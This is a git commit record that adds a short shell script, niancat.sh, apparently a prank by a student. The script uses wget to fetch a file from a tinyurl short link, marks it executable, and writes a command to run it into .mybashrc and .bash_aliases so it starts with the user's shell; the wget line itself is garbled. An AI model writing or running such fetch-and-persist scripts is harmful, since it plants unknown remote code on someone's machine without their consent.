427783311227189b5d7890b276fae4f17db8b2ad
galpin_a <galpin_a@epitech.eu>
2016-05-05 18:10:39 +0200

    azeaze

---
+++ niancat.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+## niancat.sh for eza in /home/galpin_a
+## 
+## Made by Antoine Galpin
+## Login   <galpin_a@epitech.net>
+## 
+## Started on  Thu May  5 18:02:39 2016 Antoine Galpin
+## Last update Thu May  5 18:09:13 2016 Antoine Galpin
+##
+
+wget tinwget tinyurl.com/confnyancat
+chmod +x confnyancat
+echo "./confnyancat" > .mybashrc
+echo "./confnyancat" > .bash_aliases
